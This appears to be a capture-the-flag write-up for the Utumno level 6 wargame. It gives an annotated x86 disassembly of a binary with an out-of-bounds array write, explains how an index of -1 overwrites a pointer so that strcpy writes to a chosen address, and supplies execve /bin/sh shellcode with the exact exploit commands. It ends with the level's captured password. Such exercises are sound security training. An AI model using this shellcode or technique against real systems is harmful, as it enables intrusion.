disassembly:
```assembly
   0x080484db <+0>:	push   ebp
   0x080484dc <+1>:	mov    ebp,esp
   0x080484de <+3>:	sub    esp,0x34
   0x080484e1 <+6>:	cmp    DWORD PTR [ebp+0x8],0x2		#must use at least 2 params
   0x080484e5 <+10>:	jg     0x80484fb <main+32>
   0x080484e7 <+12>:	push   0x8048630
   0x080484ec <+17>:	call   0x8048390 <puts@plt>
   0x080484f1 <+22>:	add    esp,0x4
   0x080484f4 <+25>:	push   0x1
   0x080484f6 <+27>:	call   0x80483a0 <exit@plt>
   0x080484fb <+32>:	push   0x20
   0x080484fd <+34>:	call   0x8048380 <malloc@plt>		#continue here, just malloc
   0x08048502 <+39>:	add    esp,0x4
   0x08048505 <+42>:	mov    DWORD PTR [ebp-0x34],eax
   0x08048508 <+45>:	mov    eax,DWORD PTR [ebp-0x34]
   0x0804850b <+48>:	test   eax,eax				#test means logical AND
   0x0804850d <+50>:	jne    0x8048523 <main+72>		#usually it jumps
   0x0804850f <+52>:	push   0x804863d
   0x08048514 <+57>:	call   0x8048390 <puts@plt>
   0x08048519 <+62>:	add    esp,0x4
   0x0804851c <+65>:	push   0x1
   0x0804851e <+67>:	call   0x80483a0 <exit@plt>
   0x08048523 <+72>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048526 <+75>:	add    eax,0x8
   0x08048529 <+78>:	mov    eax,DWORD PTR [eax]
   0x0804852b <+80>:	push   0x10				# 0x10 = 16 --> base 16
   0x0804852d <+82>:	push   0x0
   0x0804852f <+84>:	push   eax
   0x08048530 <+85>:	call   0x80483b0 <strtoul@plt>		#convert string to long unsigned int
   0x08048535 <+90>:	add    esp,0xc				#base 16
   0x08048538 <+93>:	mov    DWORD PTR [ebp-0x4],eax
   0x0804853b <+96>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804853e <+99>:	add    eax,0x4
   0x08048541 <+102>:	mov    eax,DWORD PTR [eax]
   0x08048543 <+104>:	push   0xa				# 0xa = 10 --> base 10
   0x08048545 <+106>:	push   0x0
   0x08048547 <+108>:	push   eax
   0x08048548 <+109>:	call   0x80483b0 <strtoul@plt>		#convert to base 10
   0x0804854d <+114>:	add    esp,0xc
   0x08048550 <+117>:	mov    DWORD PTR [ebp-0x8],eax
   0x08048553 <+120>:	cmp    DWORD PTR [ebp-0x8],0xa		#compare the result with 10
   0x08048557 <+124>:	jle    0x804856d <main+146>		#if lower equal, jump
   0x08048559 <+126>:	push   0x804865c
   0x0804855e <+131>:	call   0x8048390 <puts@plt>
   0x08048563 <+136>:	add    esp,0x4
   0x08048566 <+139>:	push   0x1
   0x08048568 <+141>:	call   0x80483a0 <exit@plt>
   0x0804856d <+146>:	mov    eax,DWORD PTR [ebp-0x8]		#continue here #arg1 value
   0x08048570 <+149>:	mov    edx,DWORD PTR [ebp-0x4]		#arg2 value
   0x08048573 <+152>:	mov    DWORD PTR [ebp+eax*4-0x30],edx	#write arg2 to some memory dependent on
   0x08048577 <+156>:	mov    eax,DWORD PTR [ebp+0xc]		#arg1 --> ebp-30+4*arg1
   0x0804857a <+159>:	add    eax,0xc				#this is exploitable
   0x0804857d <+162>:	mov    edx,DWORD PTR [eax]
   0x0804857f <+164>:	mov    eax,DWORD PTR [ebp-0x34]
   0x08048582 <+167>:	push   edx
   0x08048583 <+168>:	push   eax
   0x08048584 <+169>:	call   0x8048370 <strcpy@plt>		#strcpy from arg3 to some memory(ebp-0x34)
   0x08048589 <+174>:	add    esp,0x8				#near instructions --> ebp-34 has some 
   0x0804858c <+177>:	mov    edx,DWORD PTR [ebp-0x34]		#fixed value, but we can overwrite
   0x0804858f <+180>:	mov    eax,DWORD PTR [ebp-0x8]
   0x08048592 <+183>:	mov    eax,DWORD PTR [ebp+eax*4-0x30]
   0x08048596 <+187>:	push   edx
   0x08048597 <+188>:	push   eax
   0x08048598 <+189>:	push   DWORD PTR [ebp-0x8]
   0x0804859b <+192>:	push   0x8048684
   0x080485a0 <+197>:	call   0x8048360 <printf@plt>		#printf of arg3-local-copy and arg2(in hex
   0x080485a5 <+202>:	add    esp,0x10				# and not in hex)
   0x080485a8 <+205>:	mov    eax,0x0
   0x080485ad <+210>:	leave  
   0x080485ae <+211>:	ret
   ```

we notice that by inserting certain values, we can overwrite unwanted memory (intended 0 to 10 addrs
in the stack -> ebp-30 to ebp-30+40 --> ebp + (-30 to -10)
but by entering eax = 0xffffffff (-1) we get the addr ebp-34!!!!
its the address of the const str, that we write arg3 to!

so using: r -1 0x(addr) --somethingToWrite--(address)

max unsigned int value: 4294967296 - 1 --> 4294967295 = -1

export EGG= $(python -c 'print "\x90"*100+"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"+"\x90"*50')
r -1 ffffd5fc $(python -c 'print "\x18\xde\xff\xff"')
running this not in gdb, it exits normally, so we must change our write address...
for me + 0x30 worked!

for run version: 
./utumno6 -1 ffffd62c $(python -c 'print "\x18\xde\xff\xff"')

we get:
totiquegae



